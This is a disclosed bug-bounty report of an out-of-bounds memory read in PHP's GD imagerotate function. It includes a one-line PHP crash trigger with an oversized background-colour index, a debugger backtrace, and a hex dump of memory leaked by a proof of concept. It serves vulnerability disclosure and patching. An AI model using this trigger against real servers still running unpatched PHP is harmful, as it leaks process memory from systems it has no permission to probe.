# Arbitary Memory Read via gdImageRotateInterpolated Array Index Out of Bounds

## Report Details
- **Report ID**: 110720
- **URL**: https://hackerone.com/reports/110720
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-14T17:19:24.870Z
- **Disclosed**: 2019-11-12T09:38:12.885Z

## Reporter
- **Username**: libnex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
1)Bug report at: https://bugs.php.net/bug.php?id=70976&edit=2
2) Patch submitted: https://www.dropbox.com/s/rr5xti66cpt17mn/gd_interpolation.patch?dl=0
3) Issue has been fixed in PHP 5.5.31, 5.6.17, 7.0.2


---Vuln Description--
This is the function prototype for ImageRotate:

resource imagerotate ( resource $image , float $angle , int $bgd_color [, int $ignore_transparent = 0 ] )


$bgd_color specifies the background color of an image have it has been rotated. This is passed in as an integer that represents an index to the color palette.

There is a lack of validation of $bgd_color. One can pass in a large number that exceeds the color palette array. This reads memory beyond the color palette. Information of the memory leak can then be obtained via the background color after the image has been rotated.

Test script:
---------------
./configure --with-gd


1) Pass in a large $bgd_color:

php -r "imagerotate(imagecreate(1,1),45,0x7ffffff9);"


2) This causes it to crash at gd_interpolation.c:2174  :


Stopped reason: SIGSEGV
0x00000000005fb0b4 in gdImageRotateInterpolated (src=0x7ffff7fb5b38, angle=45, bgcolor=0x7ffffff9) at php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174
2174                            bgcolor =  gdTrueColorAlpha(src->red[bgcolor], src->green[bgcolor], src->blue[bgcolor], src->alpha[bgcolor]);



gdb-peda$ bt
#0  0x00000000005fb0b4 in gdImageRotateInterpolated (src=0x7ffff7fb5b38, angle=45, bgcolor=0x7ffffff9) at /home/elaw/php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174
#1  0x00000000005d0b73 in zif_imagerotate (ht=0x3, return_value=0x7ffff7fb5810, return_value_ptr=0x7ffff7f80090, this_ptr=0x0, return_value_used=0x0)
 at /home/elaw/php-5.6.15/ext/gd/gd.c:2111
#2  0x0000000000850915 in zend_do_fcall_common_helper_SPEC (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:558
#3  0x000000000085856c in ZEND_DO_FCALL_SPEC_CONST_HANDLER (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:2602
#4  0x000000000084ee1a in execute_ex (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:363
#5  0x000000000084f806 in zend_execute (op_array=0x7ffff7fb42f8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:388
#6  0x00000000007f6636 in zend_eval_stringl (str=0x106ff80 "imagerotate(imagecreate(1,1),45,2147483641);", str_len=0x2c, retval_ptr=0x0,
 string_name=0xd46ac4 "Command line code") at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1077
#7  0x00000000007f68bc in zend_eval_stringl_ex (str=0x106ff80 "imagerotate(imagecreate(1,1),45,2147483641);", str_len=0x2c, retval_ptr=0x0,
 string_name=0xd46ac4 "Command line code", handle_exceptions=0x1) at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1124
#8  0x00000000007f6940 in zend_eval_string_ex (str=0x106ff80 "imagerotate(imagecreate(1,1),45,2147483641);", retval_ptr=0x0, string_name=0xd46ac4 "Command line code",
 handle_exceptions=0x1) at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1135
#9  0x000000000092ce99 in do_cli (argc=0x3, argv=0x106ff00) at /home/elaw/php-5.6.15/sapi/cli/php_cli.c:1034
#10 0x000000000092ddc5 in main (argc=0x3, argv=0x106ff00) at /home/elaw/php-5.6.15/sapi/cli/php_cli.c:1378
#11 0x00007ffff6027b45 in __libc_start_main (main=0x92d722 <main>, argc=0x3, argv=0x7fffffffe338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,
 stack_end=0x7fffffffe328) at libc-start.c:287
#12 0x0000000000421409 in _start ()


3) One can see that the color platte only has 256 entries:

gdb-peda$ ptype src
type = struct gdImageStruct {
......
    int red[256];
    int green[256];
    int blue[256];
....


4) Thus we are encountering an array index out of bounds.



5) I've created a full exploit that reads large contiguous chunk of memory. The POC can be obtained from https://www.dropbox.com/s/bwuivbug62ki4cs/gdImageRotateInterpolated_Array_Index_OOB_MEM_Read.php?dl=0


./php gdImageRotateInterpolated_Array_Index_OOB_MEM_Read.php


0c40  01 00 00 00 01 00 00 00  01 00 00 00 01 00 00 00   ........ ........
0c50  01 00 00 00 01 00 00 00  01 00 00 00 01 00 00 9d   ........ .......�
0c60  01 00 00 9d 01 00 00 fd  01 00 00 00 01 00 00 00   ...�...� ........
0c70  01 00 00 ef 01 00 00 00  01 00 00 2f 01 00 00 00   ...�.... .../....
0c80  01 00 00 20 01 00 00 ff  01 00 00 c8 01 00 00 ff   ... ...� ...�...�
0c90  01 00 00 20 01 00 00 ff  01 00 00 c8 01 00 00 ff   ... ...� ...�...�
0ca0  01 00 00 70 01 00 00 ff  01 00 00 60 01 00 00 ff   ...p...� ...`...�
0cb0  01 00 00 08 01 00 00 ff  01 00 00 b0 01 00 00 ff   .......� ...�...�
0cc0  01 00 00 58 01 00 00 ff  01 00 00 88 01 00 00 ff   ...X...� ...�...�
0cd0  01 00 00 30 01 00 00 ff  01 00 00 d8 01 00 00 ff   ...0...� ...�...�
0ce0  01 00 00 80 01 00 00 ff  01 00 00 28 01 00 00 ff   ...�...� ...(...�
0cf0  01 00 00 d0 01 00 00 ff  01 00 00 58 01 00 00 ff   ...�...� ...X...�
0d00  01 00 00 00 01 00 00 ff  01 00 00 a8 01 00 00 ff   .......� ...�...�
0d10  01 00 00 50 01 00 00 ff  01 00 00 f8 01 00 00 ff   ...P...� ...�...�
0d20  01 00 00 a0 01 00 00 ff  01 00 00 d8 01 00 00 ff   ...�...� ...�...�
0d30  01 00 00 80 01 00 00 ff  01 00 00 28 01 00 00 ff   ...�...� ...(...�
0d40  01 00 00 d0 01 00 00 ff  01 00 00 78 01 00 00 ff   ...�...� ...x...�
0d50  01 00 00 20 01 00 00 ff  01 00 00 f0 01 00 00 ff   ... ...� ...�...�
0d60  01 00 00 98 01 00 00 ff  01 00 00 40 01 00 00 ff   ...�...� ...@...�
.....


## Attachments
No attachments
